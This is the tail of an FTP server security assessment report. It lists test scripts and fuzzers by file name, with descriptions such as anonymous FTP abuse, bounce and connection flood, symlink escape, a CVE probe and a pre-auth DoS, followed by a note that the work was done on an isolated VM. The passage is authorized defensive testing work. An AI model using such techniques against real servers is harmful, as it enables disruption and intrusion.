| `scripts/attack_02_anon_abuse.py` | Anonymous FTP abuse testing |
| `scripts/attack_03_bounce_flood.py` | FTP bounce and connection flood |
| `scripts/attack_04_privesc_cve.py` | SITE CHMOD, symlink escape, CVE probe |
| `scripts/phase4_stor_trigger.py` | Isolated STOR boundary testing (Phase 4) |
| `scripts/phase4_preauth_longcmd.py` | Pre-auth long command DoS characterization |
| `scripts/phase4_memory_leak.py` | Memory leak monitoring across operation types |
| `scripts/phase4_gdb_e2big_trace.sh` | strace capture script for E2BIG path |
| `fuzzers/ftp_comprehensive_fuzzer.py` | 8-fuzzer suite (main fuzzing engine) |
| `fuzzers/boofuzz_ftp_statemachine.py` | boofuzz FTP state machine |
| `fuzzers/ftp_glob_fuzzer.py` | Dedicated glob expansion fuzzer with PASV |

---

*End of Report*

---
**Assessment conducted on isolated local Kali Linux VM. No production systems were tested.**
**All findings disclosed responsibly per authorized testing.**
